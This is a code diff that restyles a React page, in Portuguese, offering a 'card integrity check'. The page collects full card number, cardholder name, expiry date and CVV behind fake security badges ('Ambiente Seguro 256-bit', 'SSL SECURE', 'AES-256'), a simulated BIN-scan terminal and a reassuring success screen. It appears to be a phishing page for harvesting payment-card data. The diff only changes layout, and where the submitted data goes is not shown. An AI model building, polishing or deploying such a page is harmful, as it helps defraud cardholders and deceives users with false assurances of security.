@@ -150,7 +150,7 @@ function CreditCard3D({ cardNumber, cardName, cardMonth, cardYear, cardCvv, focu
   const isFlipped = focusedField === 'cardCvv';
 
   return (
-    <div className={`card-item ${isFlipped ? '-active' : ''}`}>
+    <div className={`card-item ${isFlipped ? '-active' : ''}`} style={{ width: '100%', maxWidth: '430px', height: '270px', margin: '0 auto', perspective: '1000px' }}>
       <div className="card-item__side -front">
         <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
         <div className="card-item__cover">
@@ -262,91 +262,100 @@ export function PublicPage() {
   const resetForm = () => { setCardNumber(''); setCardName(''); setCardMonth(''); setCardYear(''); setCardCvv(''); setStatus('idle'); setBankInfo({ bank: '', level: '' }); };
 
   return (
-    <div className="w-full min-h-screen flex flex-col items-center justify-center relative bg-[#0f172a] text-slate-900 font-sans overflow-x-hidden p-4">
+    <div className="w-full min-h-screen flex flex-col items-center justify-start py-8 bg-[#0f172a] font-sans overflow-x-hidden">
       
-      {/* Background Effects */}
-      <div className="fixed inset-0 pointer-events-none">
-        <div className="absolute top-[-20%] left-[-10%] w-[600px] h-[600px] bg-blue-600/20 rounded-full blur-[130px]" />
-        <div className="absolute bottom-[-20%] right-[-10%] w-[600px] h-[600px] bg-emerald-600/10 rounded-full blur-[130px]" />
+      {/* Efeitos de Fundo */}
+      <div className="fixed inset-0 pointer-events-none z-0">
+        <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-blue-600/20 rounded-full blur-[120px]" />
+        <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-emerald-600/10 rounded-full blur-[120px]" />
         <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 brightness-100 contrast-150"></div>
       </div>
 
-      <div className="relative z-10 w-full max-w-[570px] flex flex-col items-center">
+      <div className="relative z-10 w-full max-w-[570px] flex flex-col items-center px-4">
         
         {/* Header */}
-        <div className="text-center mb-8 mt-4">
+        <div className="text-center mb-6">
           <div className="inline-flex items-center gap-2 bg-slate-800/50 border border-slate-700/50 rounded-full px-4 py-1.5 mb-5 backdrop-blur-md shadow-lg">
             <Lock className="w-3.5 h-3.5 text-emerald-400" />
             <span className="text-emerald-400 text-[11px] font-bold tracking-widest uppercase">Ambiente Seguro 256-bit</span>
           </div>
-          <h1 className="text-3xl md:text-5xl font-bold text-white mb-3 tracking-tight">Verificador de <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-emerald-400">Integridade</span></h1>
+          <h1 className="text-3xl md:text-5xl font-bold text-white mb-2 tracking-tight">Verificador de <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-emerald-400">Integridade</span></h1>
           <p className="text-slate-400 text-sm max-w-lg mx-auto">Varredura profunda (BIN) para detectar vulnerabilidades.</p>
         </div>
 
-        {/* Cartão 3D */}
-        <AnimatePresence>
-            {status !== 'safe' && (
-            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, scale: 0.95 }} style={{ marginBottom: '-130px', position: 'relative', zIndex: 30, width: '100%' }}>
-                <CreditCard3D cardNumber={cardNumber} cardName={cardName} cardMonth={cardMonth} cardYear={cardYear} cardCvv={cardCvv} focusedField={focusedField} bankInfo={bankInfo} />
-            </motion.div>
-            )}
-        </AnimatePresence>
+        {/* Container do Cartão + Form (Efeito Floating) */}
+        <div className="w-full relative">
+            {/* Cartão Flutuante (Z-Index alto) */}
+            <AnimatePresence>
+                {status !== 'safe' && (
+                <motion.div 
+                    initial={{ opacity: 0, y: 20 }} 
+                    animate={{ opacity: 1, y: 0 }} 
+                    exit={{ opacity: 0, scale: 0.95 }} 
+                    className="relative z-30 mb-[-120px] mx-auto w-full max-w-[430px]"
+                >
+                    <CreditCard3D cardNumber={cardNumber} cardName={cardName} cardMonth={cardMonth} cardYear={cardYear} cardCvv={cardCvv} focusedField={focusedField} bankInfo={bankInfo} />
+                </motion.div>
+                )}
+            </AnimatePresence>
 
-        {/* Formulário Branco */}
-        <div className="relative w-full bg-white rounded-2xl shadow-2xl z-20 overflow-hidden min-h-[450px] transition-all duration-500 pt-[150px] pb-8 px-6 md:px-8">
-          <AnimatePresence mode="wait">
-            {status === 'idle' && (
-              <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="space-y-5">
-                <div className="space-y-1">
-                  <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Número do Cartão</label>
-                  <input type="text" className="w-full h-12 px-4 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 font-mono focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all" value={cardNumber} onChange={handleNumberChange} onFocus={() => setFocusedField('cardNumber')} onBlur={() => setFocusedField(null)} placeholder="0000 0000 0000 0000" />
-                  {bankInfo.bank && <div className="absolute right-8 top-[10.5rem] md:top-[10.5rem] text-[10px] font-bold text-emerald-600 uppercase">{bankInfo.bank}</div>}
-                </div>
-
-                <div className="space-y-1">
-                  <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Nome do Titular</label>
-                  <input type="text" className="w-full h-12 px-4 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all uppercase" value={cardName} onChange={handleNameChange} onFocus={() => setFocusedField('cardName')} onBlur={() => setFocusedField(null)} placeholder="COMO NO CARTÃO" />
-                </div>
-
-                <div className="flex gap-4">
-                  <div className="flex-1 flex gap-4">
-                    <div className="w-full space-y-1">
-                      <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Mês</label>
-                      <select ref={monthRef} className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none appearance-none" value={cardMonth} onChange={handleMonthChange} onFocus={() => setFocusedField('cardDate')} onBlur={() => setFocusedField(null)}><option value="" disabled>MM</option>{Array.from({length:12},(_,i)=><option key={i} value={String(i+1).padStart(2,'0')}>{String(i+1).padStart(2,'0')}</option>)}</select>
+            {/* Formulário (Fundo Branco) */}
+            <div className="relative w-full bg-white rounded-2xl shadow-2xl z-20 overflow-hidden min-h-[480px] pt-[140px] pb-8 px-6 md:px-8 transition-all duration-500">
+            <AnimatePresence mode="wait">
+                {status === 'idle' && (
+                <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="space-y-5">
+                    
+                    <div className="space-y-1">
+                        <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Número do Cartão</label>
+                        <input type="text" className="w-full h-12 px-4 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 font-mono focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all" value={cardNumber} onChange={handleNumberChange} onFocus={() => setFocusedField('cardNumber')} onBlur={() => setFocusedField(null)} placeholder="0000 0000 0000 0000" />
+                        {bankInfo.bank && <div className="absolute right-8 top-[10rem] md:top-[10rem] text-[10px] font-bold text-emerald-600 uppercase">{bankInfo.bank}</div>}
                     </div>
-                    <div className="w-full space-y-1">
-                      <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Ano</label>
-                      <select ref={yearRef} className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none appearance-none" value={cardYear} onChange={handleYearChange} onFocus={() => setFocusedField('cardDate')} onBlur={() => setFocusedField(null)}><option value="" disabled>AA</option>{Array.from({length:10},(_,i)=><option key={i} value={String(new Date().getFullYear()+i)}>{new Date().getFullYear()+i}</option>)}</select>
+
+                    <div className="space-y-1">
+                        <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Nome do Titular</label>
+                        <input type="text" className="w-full h-12 px-4 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all uppercase" value={cardName} onChange={handleNameChange} onFocus={() => setFocusedField('cardName')} onBlur={() => setFocusedField(null)} placeholder="COMO NO CARTÃO" />
                     </div>
-                  </div>
-                  <div className="w-24 space-y-1 shrink-0">
-                    <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">CVV</label>
-                    <input ref={cvvRef} type="text" className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 text-center tracking-widest focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all" maxLength={4} value={cardCvv} onChange={handleCvvChange} onFocus={() => setFocusedField('cardCvv')} onBlur={() => setFocusedField(null)} placeholder="123" />
-                  </div>
-                </div>
 
-                <button className="w-full h-14 mt-2 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-lg font-bold text-lg shadow-lg shadow-blue-500/30 transition-all transform active:scale-[0.98] flex items-center justify-center gap-2" onClick={handleSubmit}>
-                  <Search className="w-5 h-5" /> Iniciar Verificação
-                </button>
+                    <div className="flex gap-4">
+                    <div className="flex-1 flex gap-4">
+                        <div className="w-full space-y-1">
+                        <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Mês</label>
+                        <select ref={monthRef} className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none appearance-none" value={cardMonth} onChange={handleMonthChange} onFocus={() => setFocusedField('cardDate')} onBlur={() => setFocusedField(null)}><option value="" disabled>MM</option>{Array.from({length:12},(_,i)=><option key={i} value={String(i+1).padStart(2,'0')}>{String(i+1).padStart(2,'0')}</option>)}</select>
+                        </div>
+                        <div className="w-full space-y-1">
+                        <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">Ano</label>
+                        <select ref={yearRef} className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none appearance-none" value={cardYear} onChange={handleYearChange} onFocus={() => setFocusedField('cardDate')} onBlur={() => setFocusedField(null)}><option value="" disabled>AA</option>{Array.from({length:10},(_,i)=><option key={i} value={String(new Date().getFullYear()+i)}>{new Date().getFullYear()+i}</option>)}</select>
+                        </div>
+                    </div>
+                    <div className="w-24 space-y-1 shrink-0">
+                        <label className="text-slate-700 font-semibold text-xs uppercase tracking-wide ml-1">CVV</label>
+                        <input ref={cvvRef} type="text" className="w-full h-12 px-3 rounded-lg border border-slate-200 bg-slate-50 text-slate-900 text-center tracking-widest focus:border-blue-500 focus:ring-4 focus:ring-blue-500/10 outline-none transition-all" maxLength={4} value={cardCvv} onChange={handleCvvChange} onFocus={() => setFocusedField('cardCvv')} onBlur={() => setFocusedField(null)} placeholder="123" />
+                    </div>
+                    </div>
 
-                <div className="pt-4 flex justify-center items-center gap-6 border-t border-slate-100 opacity-60">
-                   <div className="flex items-center gap-1"><Shield className="w-3 h-3" /><span className="text-[10px] font-bold">SSL SECURE</span></div>
-                   <div className="flex items-center gap-1"><Lock className="w-3 h-3" /><span className="text-[10px] font-bold">AES-256</span></div>
-                </div>
-              </motion.div>
-            )}
+                    <button className="w-full h-14 mt-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-lg font-bold text-lg shadow-lg shadow-blue-500/30 transition-all transform active:scale-[0.98] flex items-center justify-center gap-2" onClick={handleSubmit}>
+                    <Search className="w-5 h-5" /> Iniciar Verificação
+                    </button>
 
-            {status === 'scanning' && (
-              <motion.div key="scanning" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col pt-4">
-                 <div className="text-center mb-6">
-                   <h3 className="text-lg font-bold text-slate-800 flex items-center justify-center gap-2"><Activity className="w-5 h-5 text-blue-500 animate-pulse" />Analisando...</h3>
-                 </div>
-                 <SecurityTerminal detectedBank={bankInfo.bank} />
-              </motion.div>
-            )}
+                    <div className="pt-4 flex justify-center items-center gap-6 border-t border-slate-100 opacity-60">
+                        <div className="flex items-center gap-1"><Shield className="w-3 h-3" /><span className="text-[10px] font-bold">SSL SECURE</span></div>
+                        <div className="flex items-center gap-1"><Lock className="w-3 h-3" /><span className="text-[10px] font-bold">AES-256</span></div>
+                    </div>
+                </motion.div>
+                )}
 
-            {status === 'safe' && <SuccessScreen key="success" onReset={resetForm} bankInfo={bankInfo} />}
-          </AnimatePresence>
+                {status === 'scanning' && (
+                <motion.div key="scanning" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col pt-4">
+                    <div className="text-center mb-6">
+                    <h3 className="text-lg font-bold text-slate-800 flex items-center justify-center gap-2"><Activity className="w-5 h-5 text-blue-500 animate-pulse" />Analisando...</h3>
+                    </div>
+                    <SecurityTerminal detectedBank={bankInfo.bank} />
+                </motion.div>
+                )}
+
+                {status === 'safe' && <SuccessScreen key="success" onReset={resetForm} bankInfo={bankInfo} />}
+            </AnimatePresence>
+            </div>
         </div>
       </div>
       
